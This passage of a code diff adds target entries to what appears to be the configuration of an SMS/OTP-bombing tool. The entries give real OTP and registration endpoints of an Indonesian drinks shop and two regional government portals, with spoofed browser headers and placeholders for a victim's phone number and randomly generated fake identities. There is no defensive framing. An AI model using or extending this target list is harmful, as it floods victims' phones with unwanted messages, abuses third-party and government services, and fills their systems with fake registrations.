@@ -565,4 +565,90 @@
         },
         {
             "name": "MinumYukKaka",
+            "url": "https://minumyukkaka.com/services/identity/requestOTP",
+            "method": "POST",
+            "headers": {
+                "Host": "minumyukkaka.com",
+                "sec-ch-ua-platform": "Android",
+                "x-sat": "{random_xsat}",
+                "sec-ch-ua": "Chromium",
+                "sec-ch-ua-mobile": "?1",
+                "x-requested-with": "XMLHttpRequest",
+                "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36",
+                "accept": "*/*",
+                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+                "origin": "https://minumyukkaka.com",
+                "referer": "https://minumyukkaka.com/register",
+                "accept-encoding": "gzip, deflate, br, zstd",
+                "accept-language": "id,en-US;q=0.9,en;q=0.8"
+            },
+            "body": {
+                "destination": "{phone_08}",
+                "otpLength": "6"
+            },
+            "phoneFormat": "08"
+        },
+        {
+            "name": "Sidemang",
+            "url": "https://sidemang.palembang.go.id/api/users/register/send-otp",
+            "method": "POST",
+            "headers": {
+                "Host": "sidemang.palembang.go.id",
+                "sec-ch-ua-platform": "Android",
+                "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36",
+                "accept": "application/json, text/plain, */*",
+                "sec-ch-ua": "Chromium",
+                "content-type": "application/json",
+                "sec-ch-ua-mobile": "?1",
+                "origin": "https://sidemang.palembang.go.id",
+                "sec-fetch-site": "same-origin",
+                "sec-fetch-mode": "cors",
+                "sec-fetch-dest": "empty",
+                "referer": "https://sidemang.palembang.go.id/lambidaro/register-otp",
+                "accept-encoding": "gzip, deflate, br, zstd",
+                "accept-language": "id,en-US;q=0.9,en;q=0.8"
+            },
+            "cookies": {
+                "_ga": "GA1.1.{random}.{timestamp}",
+                "_ga_0Q2HYJNQP5": "GS2.1.s{timestamp}o1g1t{timestamp}j47l0h0"
+            },
+            "body": {
+                "phoneNumber": "{phone_08}",
+                "email": "{random_email}"
+            },
+            "phoneFormat": "08"
+        },
+        {
+            "name": "LaporMasBup",
+            "url": "https://lapormasbup.klaten.go.id/api/register",
+            "method": "POST",
+            "headers": {
+                "Host": "lapormasbup.klaten.go.id",
+                "sec-ch-ua-platform": "Android",
+                "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36",
+                "sec-ch-ua": "Chromium",
+                "Content-Type": "application/json",
+                "sec-ch-ua-mobile": "?1",
+                "Accept": "*/*",
+                "Origin": "https://lapormasbup.klaten.go.id",
+                "Sec-Fetch-Site": "same-origin",
+                "Sec-Fetch-Mode": "cors",
+                "Sec-Fetch-Dest": "empty",
+                "Referer": "https://lapormasbup.klaten.go.id/registrasi",
+                "Accept-Encoding": "gzip, deflate, br, zstd",
+                "Accept-Language": "id,en-US;q=0.9,en;q=0.8"
+            },
+            "body": {
+                "name": "{random_name}",
+                "email": "{random_email}",
+                "mobilephone": "{phone_08}",
+                "gender": "{random_gender}",
+                "warga_birth_date": "{random_birth_date}",
+                "password": "{random_password}",
+                "address": "{random_address}"
+            },
+            "phoneFormat": "08"
+        },
+        {
+            "name": "TuneUp",
             "url": 
